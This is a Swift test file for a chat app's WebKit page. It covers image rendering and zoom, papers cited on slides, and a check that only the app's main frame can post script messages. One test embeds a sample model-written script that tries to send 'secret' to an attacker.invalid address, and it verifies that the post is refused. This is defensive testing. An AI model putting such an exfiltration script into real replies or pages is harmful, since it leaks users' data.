import Foundation
import Testing
import WebKit
@testable import ForeverLM

/// The chat transcript is a web page. These tests load the real message
/// template into a WKWebView and check the picture pipeline in it: the
/// Markdown image the tool asked the assistant to paste becomes a figure with a
/// Copy button, waits for the app to supply bytes, and either shows them or
/// says the picture is unavailable.
@Suite("Chat source image rendering")
struct ChatSourceImageRenderingTests {
    private static let token = "foreverlm://image/ch3/page/9"
    private static let pngDataURL =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="

    @MainActor
    private func loadedTemplate(markdown: String) async throws -> WKWebView {
        let webView = try await ChatRobustnessTests.loadedRenderer()
        _ = try await webView.evaluateJavaScript("window.setMarkdown(\(Self.json(markdown))); true")
        return webView
    }

    private static func json(_ value: String) -> String {
        String(data: try! JSONEncoder().encode(value), encoding: .utf8)!
    }

    @Test("A source image line becomes a pending figure with no fetchable src and nothing to copy yet")
    @MainActor
    func sourceImageBecomesPendingFigure() async throws {
        let markdown = "Here is the figure:\n\n![Figure 3-4 (page 9)](\(Self.token))\n\nAnd a web picture ![web](https://example.com/a.png) stays ordinary."
        let webView = try await loadedTemplate(markdown: markdown)

        let figureCount = try await webView.evaluateJavaScript(
            "document.querySelectorAll('figure.source-image-figure').length"
        ) as? Int
        #expect(figureCount == 1)
        let pending = try await webView.evaluateJavaScript(
            "document.querySelector('figure.source-image-figure').classList.contains('source-image-pending')"
        ) as? Bool
        #expect(pending == true)
        let hasSrc = try await webView.evaluateJavaScript(
            "document.querySelector('figure.source-image-figure img').hasAttribute('src')"
        ) as? Bool
        #expect(hasSrc == false)
        let dataToken = try await webView.evaluateJavaScript(
            "document.querySelector('figure.source-image-figure img').dataset.sourceImage"
        ) as? String
        #expect(dataToken == Self.token)
        let alt = try await webView.evaluateJavaScript(
            "document.querySelector('figure.source-image-figure img').alt"
        ) as? String
        #expect(alt == "Figure 3-4 (page 9)")
        // Copy appears with the picture: there is nothing to copy until the
        // app has supplied the bytes.
        let copyButtons = try await webView.evaluateJavaScript(
            "document.querySelectorAll('figure.source-image-figure .source-image-copy').length"
        ) as? Int
        #expect(copyButtons == 0)

        // An ordinary web image is left to markdown-it and DOMPurify as before.
        let webImages = try await webView.evaluateJavaScript(
            "document.querySelectorAll('img[src^=\"https://example.com/\"]').length"
        ) as? Int
        #expect(webImages == 1)
    }

    @Test("Supplied bytes fill the figure; a nil answer marks it unavailable in place")
    @MainActor
    func suppliedBytesAndUnavailableState() async throws {
        let other = "foreverlm://image/ch3/img/2"
        let markdown = "![Figure 3-4](\(Self.token))\n\n![Missing one](\(other))"
        let webView = try await loadedTemplate(markdown: markdown)

        let json = try #require(await ChatMarkdownView.sourceImageLookupJSON(
            tokens: [Self.token, other],
            sourceImageForToken: { token in
                token == Self.token
                    ? ChatSourceImage(data: Data(base64Encoded: String(Self.pngDataURL.split(separator: ",")[1]))!, mediaType: "image/png")
                    : nil
            }
        ))
        #expect(json.contains("\"dataURL\":\"data:image/png;base64,"))
        _ = try await webView.evaluateJavaScript("window.setSourceImages(\(json)); true")

        let shownSrc = try await webView.evaluateJavaScript(
            "document.querySelector('img[data-source-image=\"\(Self.token)\"]').getAttribute('src')"
        ) as? String
        #expect(shownSrc == Self.pngDataURL)
        let stillPending = try await webView.evaluateJavaScript(
            "document.querySelector('img[data-source-image=\"\(Self.token)\"]').closest('figure').classList.contains('source-image-pending')"
        ) as? Bool
        #expect(stillPending == false)
        let draggable = try await webView.evaluateJavaScript(
            "document.querySelector('img[data-source-image=\"\(Self.token)\"]').draggable"
        ) as? Bool
        #expect(draggable == true)
        let copyLabel = try await webView.evaluateJavaScript(
            "document.querySelector('img[data-source-image=\"\(Self.token)\"]').closest('figure').querySelector('.source-image-copy').textContent"
        ) as? String
        #expect(copyLabel == "Copy")

        let unavailable = try await webView.evaluateJavaScript(
            "document.querySelector('img[data-source-image=\"\(other)\"]').closest('figure').classList.contains('source-image-unavailable')"
        ) as? Bool
        #expect(unavailable == true)
        let note = try await webView.evaluateJavaScript(
            "document.querySelector('img[data-source-image=\"\(other)\"]').closest('figure').querySelector('.source-image-note').textContent"
        ) as? String
        #expect(note == "Missing one: picture unavailable on this device")

        // Re-rendering the same markdown keeps the resolved picture without
        // asking again: the row is rebuilt as the learner scrolls.
        _ = try await webView.evaluateJavaScript("window.setMarkdown(\(Self.json(markdown))); true")
        let srcAfterRerender = try await webView.evaluateJavaScript(
            "document.querySelector('img[data-source-image=\"\(Self.token)\"]').getAttribute('src')"
        ) as? String
        #expect(srcAfterRerender == Self.pngDataURL)
    }

    /// Records what the page posts on `zoomSourceImage`: the token and the
    /// caption of the picture that was clicked.
    @MainActor
    private final class ZoomRecorder: NSObject, WKScriptMessageHandler {
        var clicks: [(token: String, alt: String)] = []

        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            guard let body = message.body as? [String: Any], let token = body["token"] as? String else { return }
            clicks.append((token, body["alt"] as? String ?? ""))
        }
    }

    @Test("A resolved picture is zoomable, and a click posts its token and caption; a pending one is not")
    @MainActor
    func clickOnResolvedPictureAsksToZoom() async throws {
        let recorder = ZoomRecorder()
        let configuration = WKWebViewConfiguration()
        configuration.userContentController.add(recorder, name: "zoomSourceImage")
        let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: 640, height: 480), configuration: configuration)
        ChatMarkdownView.loadTemplate(into: webView)
        var ready = false
        for _ in 0..<150 where !ready {
            ready = try await webView.evaluateJavaScript("typeof window.setSourceImages === 'function'") as? Bool ?? false
            if !ready { try await Task.sleep(for: .milliseconds(100)) }
        }
        #expect(ready)
        _ = try await webView.evaluateJavaScript("window.setMarkdown(\(Self.json("![Figure 2a](\(Self.token))"))); true")

        let img = "document.querySelector('img[data-source-image=\"\(Self.token)\"]')"
        // Nothing to zoom until the bytes are here.
        #expect(try await webView.evaluateJavaScript("\(img).classList.contains('source-image-zoomable')") as? Bool == false)
        _ = try await webView.evaluateJavaScript("\(img).click(); true")
        try await Task.sleep(for: .milliseconds(100))
        #expect(recorder.clicks.isEmpty)

        let json = try #require(await ChatMarkdownView.sourceImageLookupJSON(
            tokens: [Self.token],
            sourceImageForToken: { _ in
                ChatSourceImage(data: Data(base64Encoded: String(Self.pngDataURL.split(separator: ",")[1]))!, mediaType: "image/png")
            }
        ))
        _ = try await webView.evaluateJavaScript("window.setSourceImages(\(json)); true")
        #expect(try await webView.evaluateJavaScript("\(img).classList.contains('source-image-zoomable')") as? Bool == true)
        #expect(try await webView.evaluateJavaScript("getComputedStyle(\(img)).cursor") as? String == "zoom-in")

        _ = try await webView.evaluateJavaScript("\(img).click(); true")
        for _ in 0..<50 where recorder.clicks.isEmpty {
            try await Task.sleep(for: .milliseconds(50))
        }
        #expect(recorder.clicks.count == 1)
        #expect(recorder.clicks.first?.token == Self.token)
        #expect(recorder.clicks.first?.alt == "Figure 2a")

        // Redecorating the same picture binds the click once, not twice.
        _ = try await webView.evaluateJavaScript("window.setSourceImages(\(json)); \(img).click(); true")
        for _ in 0..<50 where recorder.clicks.count < 2 {
            try await Task.sleep(for: .milliseconds(50))
        }
        try await Task.sleep(for: .milliseconds(100))
        #expect(recorder.clicks.count == 2)
    }

    @Test("The lightbox fits a picture on entry, no closer than two points per pixel, and a click toggles a closer look")
    func lightboxMagnification() {
        // A wide figure fits to the narrower of the two ratios.
        #expect(ChatImageLightbox.fitMagnification(viewport: CGSize(width: 1000, height: 800), document: CGSize(width: 2000, height: 1000)) == 0.5)
        // A small picture fills, but stops at 2.
        #expect(ChatImageLightbox.fitMagnification(viewport: CGSize(width: 1000, height: 800), document: CGSize(width: 100, height: 100)) == 2)
        #expect(ChatImageLightbox.fitMagnification(viewport: .zero, document: CGSize(width: 100, height: 100)) == 1)

        // From the fit, a click doubles it (at least to one point per pixel).
        #expect(ChatImageLightbox.toggledMagnification(current: 0.5, fit: 0.5, maximum: 8) == 1)
        #expect(ChatImageLightbox.toggledMagnification(current: 0.25, fit: 0.25, maximum: 8) == 1)
        #expect(ChatImageLightbox.toggledMagnification(current: 1.5, fit: 1.5, maximum: 8) == 3)
        #expect(ChatImageLightbox.toggledMagnification(current: 6, fit: 6, maximum: 8) == 8)
        // From anywhere else, a click fits again.
        #expect(ChatImageLightbox.toggledMagnification(current: 1, fit: 0.5, maximum: 8) == 0.5)
        #expect(ChatImageLightbox.toggledMagnification(current: 3.7, fit: 0.5, maximum: 8) == 0.5)
    }

    @Test("A slide lists the papers read off its own frame that can be opened or added, and a paper names its frame")
    func slideCitedPapersMatchTheirFrame() throws {
        let frame = ChatSourceImage.SlideFrame(sourceID: "video", imagePath: "Slides/video/slide-7.jpg", timeSeconds: 317)
        let added = VideoCitedPaper(
            id: "added", sourceID: "video", title: "Cristae remodelling",
            url: "https://doi.org/10.1/a", slideImagePath: "Slides/video/slide-7.jpg",
            status: .imported, importedSourceID: "paper-a"
        )
        let onOffer = VideoCitedPaper(
            id: "offer", sourceID: "video", title: "MICOS subcomplexes",
            authors: "Kondadi, A; Anand, R", year: "2020", journal: "EMBO Rep",
            url: "https://doi.org/10.1/b", slideImagePath: "Slides/video/slide-7.jpg"
        )
        let unresolved = VideoCitedPaper(
            id: "unresolved", sourceID: "video", title: "Nothing found",
            slideImagePath: "Slides/video/slide-7.jpg", status: .unresolved
        )
        let dismissed = VideoCitedPaper(
            id: "dismissed", sourceID: "video", title: "Waved off",
            url: "https://doi.org/10.1/c", slideImagePath: "Slides/video/slide-7.jpg", status: .dismissed
        )
        // Another slide that rounds onto the same timestamp is still another slide.
        let otherSlide = VideoCitedPaper(
            id: "other", sourceID: "video", title: "Other slide",
            url: "https://doi.org/10.1/d", slideTimeSeconds: 317, slideImagePath: "Slides/video/slide-8.jpg"
        )
        // A row saved before frame paths were kept is placed by its time.
        let unframed = VideoCitedPaper(
            id: "unframed", sourceID: "video", title: "Legacy row",
            url: "https://doi.org/10.1/e", slideTimeSeconds: 317.2
        )
        let otherVideo = VideoCitedPaper(
            id: "elsewhere", sourceID: "another-video", title: "Elsewhere",
            url: "https://doi.org/10.1/f", slideImagePath: "Slides/video/slide-7.jpg"
        )

        let listed = ChatSourceImage.citedPapers(
            from: [added, onOffer, unresolved, dismissed, otherSlide, unframed, otherVideo],
            on: frame
        )
        try #require(listed.map(\.id) == ["added", "offer", "unframed"])
        #expect(listed[0].sourceID == "paper-a")
        #expect(listed[0].canAdd == false)
        #expect(listed[1].sourceID == nil)
        #expect(listed[1].canAdd)
        #expect(listed[1].subtitle == onOffer.displaySubtitle)
    }

    @Test("A slide picture sends its papers to the page, and any other picture sends none")
    func citedPapersEncodeOnlyWhenPresent() throws {
        let data = try #require(Data(base64Encoded: String(Self.pngDataURL.split(separator: ",")[1])))
        let plain = ChatSourceImage(data: data, mediaType: "image/png")
        let plainJSON = try #require(String(data: JSONEncoder().encode(plain), encoding: .utf8))
        #expect(!plainJSON.contains("citedPapers"))

        var slide = plain
        slide.citedPapers = [ChatSourceImage.CitedPaper(VideoCitedPaper(
            id: "offer", sourceID: "video", title: "MICOS subcomplexes", url: "https://doi.org/10.1/b"
        ))]
        let object = try #require(
            JSONSerialization.jsonObject(with: JSONEncoder().encode(slide)) as? [String: Any]
        )
        let papers = try #require(object["citedPapers"] as? [[String: Any]])
        #expect(papers.first?["id"] as? String == "offer")
        #expect(papers.first?["canAdd"] as? Bool == true)
    }

    /// Records what the page posts, by channel, in order.
    @MainActor
    private final class PostRecorder: NSObject, WKScriptMessageHandler {
        var posts: [(name: String, body: [String: Any])] = []

        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            posts.append((message.name, message.body as? [String: Any] ?? [:]))
        }
    }

    @Test("Papers under a slide: Add asks the app by id and holds until the picture comes back, and an added one opens its source")
    @MainActor
    func slidePapersRenderUnderThePicture() async throws {
        let token = "foreverlm://image/video/slide/7"
        let recorder = PostRecorder()
        let configuration = WKWebViewConfiguration()
        configuration.userContentController.add(recorder, name: "addSlideCitedPaper")
        configuration.userContentController.add(recorder, name: "openSource")
        let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: 640, height: 480), configuration: configuration)
        ChatMarkdownView.loadTemplate(into: webView)
        var ready = false
        for _ in 0..<150 where !ready {
            ready = try await webView.evaluateJavaScript("typeof window.setSourceImages === 'function'") as? Bool ?? false
            if !ready { try await Task.sleep(for: .milliseconds(100)) }
        }
        #expect(ready)
        _ = try await webView.evaluateJavaScript("window.setMarkdown(\(Self.json("![Slide 7](\(token))"))); true")

        func images(_ papers: String) -> String {
            "window.setSourceImages({\(Self.json(token)): {dataURL: \(Self.json(Self.pngDataURL)), mediaType: 'image/png', citedPapers: \(papers)}});"
        }
        let onOffer = "[{id: 'offer', title: 'MICOS subcomplexes', subtitle: 'Kondadi et al. · EMBO Rep · 2020', sourceID: null, canAdd: true}]"
        _ = try await webView.evaluateJavaScript(images(onOffer) + " document.querySelector('.source-image-paper-add').click(); true")
        // A card landing redecorates the message; the Add in flight holds.
        let adding = try await webView.evaluateJavaScript(
            "window.setSourceCards({}); document.querySelector('.source-image-paper-add').textContent"
        ) as? String
        #expect(adding == "Adding")

        let added = "[{id: 'offer', title: 'MICOS subcomplexes', subtitle: null, sourceID: 'paper-b', canAdd: false}]"
        _ = try await webView.evaluateJavaScript(images(added) + " document.querySelector('button.source-image-paper-title').click(); true")
        let addButtons = try await webView.evaluateJavaScript(
            "document.querySelectorAll('.source-image-paper-add').length"
        ) as? Int
        #expect(addButtons == 0)
        for _ in 0..<50 where recorder.posts.count < 2 {
            try await Task.sleep(for: .milliseconds(50))
        }
        #expect(recorder.posts.map(\.name) == ["addSlideCitedPaper", "openSource"])
        #expect(recorder.posts.first?.body["token"] as? String == token)
        #expect(recorder.posts.first?.body["paperID"] as? String == "offer")
        #expect(recorder.posts.last?.body["token"] as? String == "paper-b")
    }

    @Test("Copying puts the picture on a pasteboard as an image other apps paste")
    @MainActor
    func copyWritesImageToPasteboard() throws {
        let data = try #require(Data(base64Encoded: String(Self.pngDataURL.split(separator: ",")[1])))
        let image = ChatSourceImage(data: data, mediaType: "image/png")
        let pasteboard = NSPasteboard(name: NSPasteboard.Name("ChatSourceImageRenderingTests-\(UUID().uuidString)"))
        defer { pasteboard.releaseGlobally() }
        #expect(image.copyToPasteboard(pasteboard))
        let types = pasteboard.types ?? []
        #expect(types.contains(.png))
        #expect(types.contains(.tiff))
        #expect(NSImage(pasteboard: pasteboard) != nil)
    }
}

/// Who the app's script message handlers listen to (`ScriptMessageSender`).
/// A reply's visualization runs model-written script in a sandboxed frame of
/// the chat page, and WebKit hands that frame the page's handlers: without the
/// check it could post `webLinks` and have the app open any address with no
/// click.
@Suite("Chat page script messages")
struct ChatPageScriptMessageTests {
    @Test("Only the main frame of the app's own page is heard")
    func senderDecisions() {
        func accepts(_ main: Bool, _ scheme: String, _ host: String = "", _ page: ScriptMessageSender.Page) -> Bool {
            ScriptMessageSender.accepts(isMainFrame: main, originProtocol: scheme, originHost: host, from: page)
        }
        // A page the app ships as a file.
        #expect(accepts(true, "file", "", .appFile))
        #expect(!accepts(false, "file", "", .appFile), "a frame inside the page")
        #expect(!accepts(false, "", "", .appFile), "a sandboxed frame: an opaque origin")
        #expect(!accepts(true, "", "", .appFile), "the page replaced by an opaque document")
        #expect(!accepts(true, "https", "attacker.invalid", .appFile), "the page navigated to the web")

        // A page the app renders under an address of its own.
        let doc = ScriptMessageSender.Page.appOrigin(scheme: "https", host: "foreverlm.com")
        #expect(accepts(true, "https", "foreverlm.com", doc))
        #expect(accepts(true, "HTTPS", "ForeverLM.com", doc))
        #expect(!accepts(true, "https", "foreverlm.com.attacker.invalid", doc))
        #expect(!accepts(true, "http", "foreverlm.com", doc))
        #expect(!accepts(false, "https", "foreverlm.com", doc))

        // A page from the web: the frame is all that can be checked.
        #expect(accepts(true, "https", "publisher.example", .web))
        #expect(!accepts(false, "https", "ads.example", .web))
    }

    /// Records every post with whether the gate would let it through.
    @MainActor
    private final class GateRecorder: NSObject, WKScriptMessageHandler {
        struct Post {
            let accepted: Bool
            let isMainFrame: Bool
            let url: String
        }
        var posts: [Post] = []

        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            let url = ((message.body as? [String: Any])?["url"] as? String) ?? ""
            posts.append(Post(accepted: message.isFrom(.appFile), isMainFrame: message.frameInfo.isMainFrame, url: url))
        }
    }

    @Test("A visualization's frame cannot ask the app to open an address, and still sizes itself through the page")
    @MainActor
    func visualizationFrameIsRefused() async throws {
        let recorder = GateRecorder()
        let configuration = WKWebViewConfiguration()
        configuration.userContentController.add(recorder, name: "webLinks")
        let webView = WKWebView(frame: CGRect(x: 0, y: 0, width: 640, height: 480), configuration: configuration)
        ChatMarkdownView.loadTemplate(into: webView)
        var ready = false
        for _ in 0..<150 where !ready {
            ready = try await webView.evaluateJavaScript("typeof window.setMarkdown === 'function'") as? Bool ?? false
            if !ready { try await Task.sleep(for: .milliseconds(100)) }
        }
        #expect(ready, "the chat page never loaded")

        let reply = """
        Here is the chart.

        ```visualization
        <div style="height:300px">chart</div>
        <script>window.webkit.messageHandlers.webLinks.postMessage({url: "https://attacker.invalid/?d=secret", title: "x"});</script>
        ```
        """
        let json = String(data: try JSONEncoder().encode(reply), encoding: .utf8)!
        _ = try await webView.evaluateJavaScript("window.setMarkdown(\(json)); true")
        for _ in 0..<60 where recorder.posts.isEmpty {
            try await Task.sleep(for: .milliseconds(50))
        }
        let fromFrame = try #require(recorder.posts.first, "the frame's post never arrived, so the check was never exercised")
        #expect(fromFrame.url.hasPrefix("https://attacker.invalid"))
        #expect(!fromFrame.isMainFrame)
        #expect(!fromFrame.accepted)

        // The height reaches the page by postMessage, which sizes the frame.
        var height = ""
        for _ in 0..<60 {
            height = try await webView.evaluateJavaScript(
                "document.querySelector('iframe.chat-visualization-frame').style.height"
            ) as? String ?? ""
            if height == "300px" { break }
            try await Task.sleep(for: .milliseconds(50))
        }
        #expect(height == "300px")

        // The page's own link is still heard.
        _ = try await webView.evaluateJavaScript(
            "window.webkit.messageHandlers.webLinks.postMessage({url: 'https://example.org/', title: 'Example'}); true"
        )
        for _ in 0..<60 where recorder.posts.count < 2 {
            try await Task.sleep(for: .milliseconds(50))
        }
        let fromPage = try #require(recorder.posts.last)
        #expect(fromPage.url == "https://example.org/")
        #expect(fromPage.isMainFrame)
        #expect(fromPage.accepted)
    }
}
